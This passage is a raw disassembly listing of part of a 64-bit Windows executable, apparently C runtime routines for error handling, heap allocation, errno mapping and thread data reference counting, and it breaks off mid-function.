   1400047e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400047e4:	e8 87 33 00 00       	call   0x140007b70
   1400047e9:	48 85 c0             	test   %rax,%rax
   1400047ec:	74 0a                	je     0x1400047f8
   1400047ee:	b9 16 00 00 00       	mov    $0x16,%ecx
   1400047f3:	e8 c8 33 00 00       	call   0x140007bc0
   1400047f8:	f6 05 95 08 01 00 02 	testb  $0x2,0x10895(%rip)        # 0x140015094
   1400047ff:	74 29                	je     0x14000482a
   140004801:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004806:	e8 49 6b 00 00       	call   0x14000b354
   14000480b:	85 c0                	test   %eax,%eax
   14000480d:	74 07                	je     0x140004816
   14000480f:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004814:	cd 29                	int    $0x29
   140004816:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000481c:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140004821:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140004825:	e8 9a 01 00 00       	call   0x1400049c4
   14000482a:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000482f:	e8 00 f7 ff ff       	call   0x140003f34
   140004834:	cc                   	int3
   140004835:	90                   	nop
   140004836:	90                   	nop
   140004837:	90                   	nop
   140004838:	53                   	push   %rbx
   140004839:	48 83 ec 20          	sub    $0x20,%rsp
   14000483d:	4c 8b c2             	mov    %rdx,%r8
   140004840:	48 8b d9             	mov    %rcx,%rbx
   140004843:	48 85 c9             	test   %rcx,%rcx
   140004846:	74 0e                	je     0x140004856
   140004848:	33 d2                	xor    %edx,%edx
   14000484a:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   14000484e:	48 f7 f3             	div    %rbx
   140004851:	49 3b c0             	cmp    %r8,%rax
   140004854:	72 43                	jb     0x140004899
   140004856:	49 0f af d8          	imul   %r8,%rbx
   14000485a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000485f:	48 85 db             	test   %rbx,%rbx
   140004862:	48 0f 44 d8          	cmove  %rax,%rbx
   140004866:	eb 15                	jmp    0x14000487d
   140004868:	e8 23 f8 ff ff       	call   0x140004090
   14000486d:	85 c0                	test   %eax,%eax
   14000486f:	74 28                	je     0x140004899
   140004871:	48 8b cb             	mov    %rbx,%rcx
   140004874:	e8 3b 32 00 00       	call   0x140007ab4
   140004879:	85 c0                	test   %eax,%eax
   14000487b:	74 1c                	je     0x140004899
   14000487d:	48 8b 0d 6c 19 01 00 	mov    0x1196c(%rip),%rcx        # 0x1400161f0
   140004884:	4c 8b c3             	mov    %rbx,%r8
   140004887:	ba 08 00 00 00       	mov    $0x8,%edx
   14000488c:	ff 15 0e 79 00 00    	call   *0x790e(%rip)        # 0x14000c1a0
   140004892:	48 85 c0             	test   %rax,%rax
   140004895:	74 d1                	je     0x140004868
   140004897:	eb 0d                	jmp    0x1400048a6
   140004899:	e8 52 04 00 00       	call   0x140004cf0
   14000489e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400048a4:	33 c0                	xor    %eax,%eax
   1400048a6:	48 83 c4 20          	add    $0x20,%rsp
   1400048aa:	5b                   	pop    %rbx
   1400048ab:	c3                   	ret
   1400048ac:	90                   	nop
   1400048ad:	90                   	nop
   1400048ae:	90                   	nop
   1400048af:	90                   	nop
   1400048b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048b5:	57                   	push   %rdi
   1400048b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400048ba:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   1400048be:	48 8b f9             	mov    %rcx,%rdi
   1400048c1:	48 85 d2             	test   %rdx,%rdx
   1400048c4:	74 05                	je     0x1400048cb
   1400048c6:	0f 10 02             	movups (%rdx),%xmm0
   1400048c9:	eb 11                	jmp    0x1400048dc
   1400048cb:	8b 05 db 18 01 00    	mov    0x118db(%rip),%eax        # 0x1400161ac
   1400048d1:	85 c0                	test   %eax,%eax
   1400048d3:	75 0e                	jne    0x1400048e3
   1400048d5:	0f 10 05 6c 0e 01 00 	movups 0x10e6c(%rip),%xmm0        # 0x140015748
   1400048dc:	f3 0f 7f 41 08       	movdqu %xmm0,0x8(%rcx)
   1400048e1:	eb 4f                	jmp    0x140004932
   1400048e3:	e8 c8 07 00 00       	call   0x1400050b0
   1400048e8:	48 89 07             	mov    %rax,(%rdi)
   1400048eb:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   1400048ef:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   1400048f6:	48 89 0a             	mov    %rcx,(%rdx)
   1400048f9:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140004900:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140004904:	48 8b c8             	mov    %rax,%rcx
   140004907:	e8 a0 36 00 00       	call   0x140007fac
   14000490c:	48 8b 0f             	mov    (%rdi),%rcx
   14000490f:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140004913:	e8 c8 36 00 00       	call   0x140007fe0
   140004918:	48 8b 0f             	mov    (%rdi),%rcx
   14000491b:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140004921:	a8 02                	test   $0x2,%al
   140004923:	75 0d                	jne    0x140004932
   140004925:	83 c8 02             	or     $0x2,%eax
   140004928:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   14000492e:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140004932:	48 8b c7             	mov    %rdi,%rax
   140004935:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000493a:	48 83 c4 20          	add    $0x20,%rsp
   14000493e:	5f                   	pop    %rdi
   14000493f:	c3                   	ret
   140004940:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004945:	57                   	push   %rdi
   140004946:	48 83 ec 20          	sub    $0x20,%rsp
   14000494a:	48 8b da             	mov    %rdx,%rbx
   14000494d:	48 8b f9             	mov    %rcx,%rdi
   140004950:	48 85 c9             	test   %rcx,%rcx
   140004953:	75 0a                	jne    0x14000495f
   140004955:	48 8b ca             	mov    %rdx,%rcx
   140004958:	e8 23 fe ff ff       	call   0x140004780
   14000495d:	eb 58                	jmp    0x1400049b7
   14000495f:	48 85 d2             	test   %rdx,%rdx
   140004962:	75 07                	jne    0x14000496b
   140004964:	e8 d7 fd ff ff       	call   0x140004740
   140004969:	eb 4a                	jmp    0x1400049b5
   14000496b:	48 83 fa e0          	cmp    $0xffffffffffffffe0,%rdx
   14000496f:	77 39                	ja     0x1400049aa
   140004971:	4c 8b ca             	mov    %rdx,%r9
   140004974:	4c 8b c1             	mov    %rcx,%r8
   140004977:	eb 1b                	jmp    0x140004994
   140004979:	e8 12 f7 ff ff       	call   0x140004090
   14000497e:	85 c0                	test   %eax,%eax
   140004980:	74 28                	je     0x1400049aa
   140004982:	48 8b cb             	mov    %rbx,%rcx
   140004985:	e8 2a 31 00 00       	call   0x140007ab4
   14000498a:	85 c0                	test   %eax,%eax
   14000498c:	74 1c                	je     0x1400049aa
   14000498e:	4c 8b cb             	mov    %rbx,%r9
   140004991:	4c 8b c7             	mov    %rdi,%r8
   140004994:	48 8b 0d 55 18 01 00 	mov    0x11855(%rip),%rcx        # 0x1400161f0
   14000499b:	33 d2                	xor    %edx,%edx
   14000499d:	ff 15 05 78 00 00    	call   *0x7805(%rip)        # 0x14000c1a8
   1400049a3:	48 85 c0             	test   %rax,%rax
   1400049a6:	74 d1                	je     0x140004979
   1400049a8:	eb 0d                	jmp    0x1400049b7
   1400049aa:	e8 41 03 00 00       	call   0x140004cf0
   1400049af:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400049b5:	33 c0                	xor    %eax,%eax
   1400049b7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400049bc:	48 83 c4 20          	add    $0x20,%rsp
   1400049c0:	5f                   	pop    %rdi
   1400049c1:	c3                   	ret
   1400049c2:	90                   	nop
   1400049c3:	90                   	nop
   1400049c4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400049c9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400049ce:	55                   	push   %rbp
   1400049cf:	57                   	push   %rdi
   1400049d0:	41 56                	push   %r14
   1400049d2:	48 8d ac 24 10 fb ff 	lea    -0x4f0(%rsp),%rbp
   1400049d9:	ff 
   1400049da:	48 81 ec f0 05 00 00 	sub    $0x5f0,%rsp
   1400049e1:	48 8b 05 30 06 01 00 	mov    0x10630(%rip),%rax        # 0x140015018
   1400049e8:	48 33 c4             	xor    %rsp,%rax
   1400049eb:	48 89 85 e0 04 00 00 	mov    %rax,0x4e0(%rbp)
   1400049f2:	41 8b f8             	mov    %r8d,%edi
   1400049f5:	8b f2                	mov    %edx,%esi
   1400049f7:	8b d9                	mov    %ecx,%ebx
   1400049f9:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1400049fc:	74 05                	je     0x140004a03
   1400049fe:	e8 81 d4 ff ff       	call   0x140001e84
   140004a03:	33 d2                	xor    %edx,%edx
   140004a05:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004a0a:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140004a10:	e8 ab dd ff ff       	call   0x1400027c0
   140004a15:	33 d2                	xor    %edx,%edx
   140004a17:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004a1b:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140004a21:	e8 9a dd ff ff       	call   0x1400027c0
   140004a26:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140004a2b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004a30:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004a34:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140004a38:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140004a3d:	ff 15 5d 76 00 00    	call   *0x765d(%rip)        # 0x14000c0a0
   140004a43:	4c 8b b5 08 01 00 00 	mov    0x108(%rbp),%r14
   140004a4a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004a4f:	49 8b ce             	mov    %r14,%rcx
   140004a52:	45 33 c0             	xor    %r8d,%r8d
   140004a55:	ff 15 4d 76 00 00    	call   *0x764d(%rip)        # 0x14000c0a8
   140004a5b:	48 85 c0             	test   %rax,%rax
   140004a5e:	74 36                	je     0x140004a96
   140004a60:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140004a66:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004a6b:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140004a70:	4c 8b c8             	mov    %rax,%r9
   140004a73:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004a78:	4d 8b c6             	mov    %r14,%r8
   140004a7b:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004a80:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004a85:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004a89:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004a8e:	33 c9                	xor    %ecx,%ecx
   140004a90:	ff 15 1a 76 00 00    	call   *0x761a(%rip)        # 0x14000c0b0
   140004a96:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140004a9d:	48 89 85 08 01 00 00 	mov    %rax,0x108(%rbp)
   140004aa4:	48 8d 85 08 05 00 00 	lea    0x508(%rbp),%rax
   140004aab:	48 83 c0 08          	add    $0x8,%rax
   140004aaf:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140004ab3:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140004aba:	48 8b 85 08 05 00 00 	mov    0x508(%rbp),%rax
   140004ac1:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140004ac5:	89 7c 24 74          	mov    %edi,0x74(%rsp)
   140004ac9:	ff 15 e9 75 00 00    	call   *0x75e9(%rip)        # 0x14000c0b8
   140004acf:	33 c9                	xor    %ecx,%ecx
   140004ad1:	8b f8                	mov    %eax,%edi
   140004ad3:	ff 15 ef 75 00 00    	call   *0x75ef(%rip)        # 0x14000c0c8
   140004ad9:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004ade:	ff 15 dc 75 00 00    	call   *0x75dc(%rip)        # 0x14000c0c0
   140004ae4:	85 c0                	test   %eax,%eax
   140004ae6:	75 10                	jne    0x140004af8
   140004ae8:	85 ff                	test   %edi,%edi
   140004aea:	75 0c                	jne    0x140004af8
   140004aec:	83 fb ff             	cmp    $0xffffffff,%ebx
   140004aef:	74 07                	je     0x140004af8
   140004af1:	8b cb                	mov    %ebx,%ecx
   140004af3:	e8 8c d3 ff ff       	call   0x140001e84
   140004af8:	48 8b 8d e0 04 00 00 	mov    0x4e0(%rbp),%rcx
   140004aff:	48 33 cc             	xor    %rsp,%rcx
   140004b02:	e8 99 cf ff ff       	call   0x140001aa0
   140004b07:	4c 8d 9c 24 f0 05 00 	lea    0x5f0(%rsp),%r11
   140004b0e:	00 
   140004b0f:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140004b13:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140004b17:	49 8b e3             	mov    %r11,%rsp
   140004b1a:	41 5e                	pop    %r14
   140004b1c:	5f                   	pop    %rdi
   140004b1d:	5d                   	pop    %rbp
   140004b1e:	c3                   	ret
   140004b1f:	90                   	nop
   140004b20:	48 89 0d c1 16 01 00 	mov    %rcx,0x116c1(%rip)        # 0x1400161e8
   140004b27:	c3                   	ret
   140004b28:	48 8b c4             	mov    %rsp,%rax
   140004b2b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004b2f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004b33:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004b37:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004b3b:	41 56                	push   %r14
   140004b3d:	48 83 ec 30          	sub    $0x30,%rsp
   140004b41:	41 8b f9             	mov    %r9d,%edi
   140004b44:	49 8b f0             	mov    %r8,%rsi
   140004b47:	48 8b ea             	mov    %rdx,%rbp
   140004b4a:	4c 8b f1             	mov    %rcx,%r14
   140004b4d:	e8 f2 05 00 00       	call   0x140005144
   140004b52:	48 85 c0             	test   %rax,%rax
   140004b55:	74 41                	je     0x140004b98
   140004b57:	48 8b 98 b8 03 00 00 	mov    0x3b8(%rax),%rbx
   140004b5e:	48 85 db             	test   %rbx,%rbx
   140004b61:	74 35                	je     0x140004b98
   140004b63:	48 8b cb             	mov    %rbx,%rcx
   140004b66:	ff 15 1c 77 00 00    	call   *0x771c(%rip)        # 0x14000c288
   140004b6c:	44 8b cf             	mov    %edi,%r9d
   140004b6f:	4c 8b c6             	mov    %rsi,%r8
   140004b72:	48 8b d5             	mov    %rbp,%rdx
   140004b75:	49 8b ce             	mov    %r14,%rcx
   140004b78:	48 8b c3             	mov    %rbx,%rax
   140004b7b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004b80:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004b85:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004b8a:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004b8f:	48 83 c4 30          	add    $0x30,%rsp
   140004b93:	41 5e                	pop    %r14
   140004b95:	48 ff e0             	rex.W jmp *%rax
   140004b98:	48 8b 1d 79 04 01 00 	mov    0x10479(%rip),%rbx        # 0x140015018
   140004b9f:	8b cb                	mov    %ebx,%ecx
   140004ba1:	48 33 1d 40 16 01 00 	xor    0x11640(%rip),%rbx        # 0x1400161e8
   140004ba8:	83 e1 3f             	and    $0x3f,%ecx
   140004bab:	48 d3 cb             	ror    %cl,%rbx
   140004bae:	48 85 db             	test   %rbx,%rbx
   140004bb1:	75 b0                	jne    0x140004b63
   140004bb3:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140004bb8:	44 8b cf             	mov    %edi,%r9d
   140004bbb:	4c 8b c6             	mov    %rsi,%r8
   140004bbe:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004bc3:	48 8b d5             	mov    %rbp,%rdx
   140004bc6:	49 8b ce             	mov    %r14,%rcx
   140004bc9:	e8 22 00 00 00       	call   0x140004bf0
   140004bce:	cc                   	int3
   140004bcf:	90                   	nop
   140004bd0:	48 83 ec 38          	sub    $0x38,%rsp
   140004bd4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004bda:	45 33 c9             	xor    %r9d,%r9d
   140004bdd:	45 33 c0             	xor    %r8d,%r8d
   140004be0:	33 d2                	xor    %edx,%edx
   140004be2:	33 c9                	xor    %ecx,%ecx
   140004be4:	e8 3f ff ff ff       	call   0x140004b28
   140004be9:	48 83 c4 38          	add    $0x38,%rsp
   140004bed:	c3                   	ret
   140004bee:	90                   	nop
   140004bef:	90                   	nop
   140004bf0:	48 83 ec 28          	sub    $0x28,%rsp
   140004bf4:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004bf9:	e8 56 67 00 00       	call   0x14000b354
   140004bfe:	85 c0                	test   %eax,%eax
   140004c00:	74 07                	je     0x140004c09
   140004c02:	b9 05 00 00 00       	mov    $0x5,%ecx
   140004c07:	cd 29                	int    $0x29
   140004c09:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004c0f:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140004c14:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140004c18:	e8 a7 fd ff ff       	call   0x1400049c4
   140004c1d:	ff 15 c5 74 00 00    	call   *0x74c5(%rip)        # 0x14000c0e8
   140004c23:	48 8b c8             	mov    %rax,%rcx
   140004c26:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140004c2b:	48 83 c4 28          	add    $0x28,%rsp
   140004c2f:	48 ff 25 ba 74 00 00 	rex.W jmp *0x74ba(%rip)        # 0x14000c0f0
   140004c36:	90                   	nop
   140004c37:	90                   	nop
   140004c38:	33 c0                	xor    %eax,%eax
   140004c3a:	4c 8d 0d 3f 7b 00 00 	lea    0x7b3f(%rip),%r9        # 0x14000c780
   140004c41:	49 8b d1             	mov    %r9,%rdx
   140004c44:	44 8d 40 08          	lea    0x8(%rax),%r8d
   140004c48:	3b 0a                	cmp    (%rdx),%ecx
   140004c4a:	74 2b                	je     0x140004c77
   140004c4c:	ff c0                	inc    %eax
   140004c4e:	49 03 d0             	add    %r8,%rdx
   140004c51:	83 f8 2d             	cmp    $0x2d,%eax
   140004c54:	72 f2                	jb     0x140004c48
   140004c56:	8d 41 ed             	lea    -0x13(%rcx),%eax
   140004c59:	83 f8 11             	cmp    $0x11,%eax
   140004c5c:	77 06                	ja     0x140004c64
   140004c5e:	b8 0d 00 00 00       	mov    $0xd,%eax
   140004c63:	c3                   	ret
   140004c64:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   140004c6a:	b8 16 00 00 00       	mov    $0x16,%eax
   140004c6f:	83 f9 0e             	cmp    $0xe,%ecx
   140004c72:	41 0f 46 c0          	cmovbe %r8d,%eax
   140004c76:	c3                   	ret
   140004c77:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   140004c7c:	c3                   	ret
   140004c7d:	90                   	nop
   140004c7e:	90                   	nop
   140004c7f:	90                   	nop
   140004c80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004c85:	57                   	push   %rdi
   140004c86:	48 83 ec 20          	sub    $0x20,%rsp
   140004c8a:	8b f9                	mov    %ecx,%edi
   140004c8c:	e8 b3 04 00 00       	call   0x140005144
   140004c91:	48 85 c0             	test   %rax,%rax
   140004c94:	75 09                	jne    0x140004c9f
   140004c96:	48 8d 05 ff 03 01 00 	lea    0x103ff(%rip),%rax        # 0x14001509c
   140004c9d:	eb 04                	jmp    0x140004ca3
   140004c9f:	48 83 c0 24          	add    $0x24,%rax
   140004ca3:	89 38                	mov    %edi,(%rax)
   140004ca5:	e8 9a 04 00 00       	call   0x140005144
   140004caa:	48 8d 1d e7 03 01 00 	lea    0x103e7(%rip),%rbx        # 0x140015098
   140004cb1:	48 85 c0             	test   %rax,%rax
   140004cb4:	74 04                	je     0x140004cba
   140004cb6:	48 8d 58 20          	lea    0x20(%rax),%rbx
   140004cba:	8b cf                	mov    %edi,%ecx
   140004cbc:	e8 77 ff ff ff       	call   0x140004c38
   140004cc1:	89 03                	mov    %eax,(%rbx)
   140004cc3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004cc8:	48 83 c4 20          	add    $0x20,%rsp
   140004ccc:	5f                   	pop    %rdi
   140004ccd:	c3                   	ret
   140004cce:	90                   	nop
   140004ccf:	90                   	nop
   140004cd0:	48 83 ec 28          	sub    $0x28,%rsp
   140004cd4:	e8 6b 04 00 00       	call   0x140005144
   140004cd9:	48 85 c0             	test   %rax,%rax
   140004cdc:	75 09                	jne    0x140004ce7
   140004cde:	48 8d 05 b7 03 01 00 	lea    0x103b7(%rip),%rax        # 0x14001509c
   140004ce5:	eb 04                	jmp    0x140004ceb
   140004ce7:	48 83 c0 24          	add    $0x24,%rax
   140004ceb:	48 83 c4 28          	add    $0x28,%rsp
   140004cef:	c3                   	ret
   140004cf0:	48 83 ec 28          	sub    $0x28,%rsp
   140004cf4:	e8 4b 04 00 00       	call   0x140005144
   140004cf9:	48 85 c0             	test   %rax,%rax
   140004cfc:	75 09                	jne    0x140004d07
   140004cfe:	48 8d 05 93 03 01 00 	lea    0x10393(%rip),%rax        # 0x140015098
   140004d05:	eb 04                	jmp    0x140004d0b
   140004d07:	48 83 c0 20          	add    $0x20,%rax
   140004d0b:	48 83 c4 28          	add    $0x28,%rsp
   140004d0f:	c3                   	ret
   140004d10:	48 83 ec 28          	sub    $0x28,%rsp
   140004d14:	ff 15 96 74 00 00    	call   *0x7496(%rip)        # 0x14000c1b0
   140004d1a:	48 85 c0             	test   %rax,%rax
   140004d1d:	48 89 05 cc 14 01 00 	mov    %rax,0x114cc(%rip)        # 0x1400161f0
   140004d24:	0f 95 c0             	setne  %al
   140004d27:	48 83 c4 28          	add    $0x28,%rsp
   140004d2b:	c3                   	ret
   140004d2c:	48 83 25 bc 14 01 00 	andq   $0x0,0x114bc(%rip)        # 0x1400161f0
   140004d33:	00 
   140004d34:	b0 01                	mov    $0x1,%al
   140004d36:	c3                   	ret
   140004d37:	90                   	nop
   140004d38:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004d3d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004d42:	57                   	push   %rdi
   140004d43:	48 83 ec 20          	sub    $0x20,%rsp
   140004d47:	49 8b d9             	mov    %r9,%rbx
   140004d4a:	49 8b f8             	mov    %r8,%rdi
   140004d4d:	8b 0a                	mov    (%rdx),%ecx
   140004d4f:	e8 28 17 00 00       	call   0x14000647c
   140004d54:	90                   	nop
   140004d55:	48 8b 07             	mov    (%rdi),%rax
   140004d58:	48 8b 08             	mov    (%rax),%rcx
   140004d5b:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140004d62:	48 85 c9             	test   %rcx,%rcx
   140004d65:	74 1e                	je     0x140004d85
   140004d67:	83 c8 ff             	or     $0xffffffff,%eax
   140004d6a:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140004d6e:	83 f8 01             	cmp    $0x1,%eax
   140004d71:	75 12                	jne    0x140004d85
   140004d73:	48 8d 05 36 03 01 00 	lea    0x10336(%rip),%rax        # 0x1400150b0
   140004d7a:	48 3b c8             	cmp    %rax,%rcx
   140004d7d:	74 06                	je     0x140004d85
   140004d7f:	e8 bc f9 ff ff       	call   0x140004740
   140004d84:	90                   	nop
   140004d85:	8b 0b                	mov    (%rbx),%ecx
   140004d87:	e8 44 17 00 00       	call   0x1400064d0
   140004d8c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004d91:	48 83 c4 20          	add    $0x20,%rsp
   140004d95:	5f                   	pop    %rdi
   140004d96:	c3                   	ret
   140004d97:	90                   	nop
   140004d98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004d9d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004da2:	57                   	push   %rdi
   140004da3:	48 83 ec 20          	sub    $0x20,%rsp
   140004da7:	49 8b d9             	mov    %r9,%rbx
   140004daa:	49 8b f8             	mov    %r8,%rdi
   140004dad:	8b 0a                	mov    (%rdx),%ecx
   140004daf:	e8 c8 16 00 00       	call   0x14000647c
   140004db4:	90                   	nop
   140004db5:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140004db9:	48 8b 10             	mov    (%rax),%rdx
   140004dbc:	48 8b 0f             	mov    (%rdi),%rcx
   140004dbf:	48 8b 12             	mov    (%rdx),%rdx
   140004dc2:	48 8b 09             	mov    (%rcx),%rcx
   140004dc5:	e8 7a 02 00 00       	call   0x140005044
   140004dca:	90                   	nop
   140004dcb:	8b 0b                	mov    (%rbx),%ecx
   140004dcd:	e8 fe 16 00 00       	call   0x1400064d0
   140004dd2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004dd7:	48 83 c4 20          	add    $0x20,%rsp
   140004ddb:	5f                   	pop    %rdi
   140004ddc:	c3                   	ret
   140004ddd:	90                   	nop
   140004dde:	90                   	nop
   140004ddf:	90                   	nop
   140004de0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004de5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004dea:	57                   	push   %rdi
   140004deb:	48 83 ec 20          	sub    $0x20,%rsp
   140004def:	49 8b d9             	mov    %r9,%rbx
   140004df2:	49 8b f8             	mov    %r8,%rdi
   140004df5:	8b 0a                	mov    (%rdx),%ecx
   140004df7:	e8 80 16 00 00       	call   0x14000647c
   140004dfc:	90                   	nop
   140004dfd:	48 8b 07             	mov    (%rdi),%rax
   140004e00:	48 8b 08             	mov    (%rax),%rcx
   140004e03:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140004e0a:	f0 ff 00             	lock incl (%rax)
   140004e0d:	8b 0b                	mov    (%rbx),%ecx
   140004e0f:	e8 bc 16 00 00       	call   0x1400064d0
   140004e14:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004e19:	48 83 c4 20          	add    $0x20,%rsp
   140004e1d:	5f                   	pop    %rdi
   140004e1e:	c3                   	ret
   140004e1f:	90                   	nop
   140004e20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004e25:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004e2a:	57                   	push   %rdi
   140004e2b:	48 83 ec 20          	sub    $0x20,%rsp
   140004e2f:	49 8b d9             	mov    %r9,%rbx
   140004e32:	49 8b f8             	mov    %r8,%rdi
   140004e35:	8b 0a                	mov    (%rdx),%ecx
   140004e37:	e8 40 16 00 00       	call   0x14000647c
   140004e3c:	90                   	nop
   140004e3d:	48 8b 0f             	mov    (%rdi),%rcx
   140004e40:	33 d2                	xor    %edx,%edx
   140004e42:	48 8b 09             	mov    (%rcx),%rcx
   140004e45:	e8 fa 01 00 00       	call   0x140005044
   140004e4a:	90                   	nop
   140004e4b:	8b 0b                	mov    (%rbx),%ecx
   140004e4d:	e8 7e 16 00 00       	call   0x1400064d0
   140004e52:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004e57:	48 83 c4 20          	add    $0x20,%rsp
   140004e5b:	5f                   	pop    %rdi
   140004e5c:	c3                   	ret
   140004e5d:	90                   	nop
   140004e5e:	90                   	nop
   140004e5f:	90                   	nop
   140004e60:	55                   	push   %rbp
   140004e61:	48 8b ec             	mov    %rsp,%rbp
   140004e64:	48 83 ec 50          	sub    $0x50,%rsp
   140004e68:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140004e6c:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140004e70:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004e74:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140004e78:	ba 01 00 00 00       	mov    $0x1,%edx
   140004e7d:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140004e81:	b8 05 00 00 00       	mov    $0x5,%eax
   140004e86:	89 45 20             	mov    %eax,0x20(%rbp)
   140004e89:	89 45 28             	mov    %eax,0x28(%rbp)
   140004e8c:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140004e90:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004e94:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004e98:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004e9c:	b8 04 00 00 00       	mov    $0x4,%eax
   140004ea1:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140004ea4:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140004ea7:	48 8d 05 6a 1b 01 00 	lea    0x11b6a(%rip),%rax        # 0x140016a18
   140004eae:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004eb2:	89 51 28             	mov    %edx,0x28(%rcx)
   140004eb5:	48 8d 0d d4 76 00 00 	lea    0x76d4(%rip),%rcx        # 0x14000c590
   140004ebc:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004ec0:	48 89 08             	mov    %rcx,(%rax)
   140004ec3:	48 8d 0d e6 01 01 00 	lea    0x101e6(%rip),%rcx        # 0x1400150b0
   140004eca:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004ece:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   140004ed4:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004ed8:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   140004edf:	8d 4a 42             	lea    0x42(%rdx),%ecx
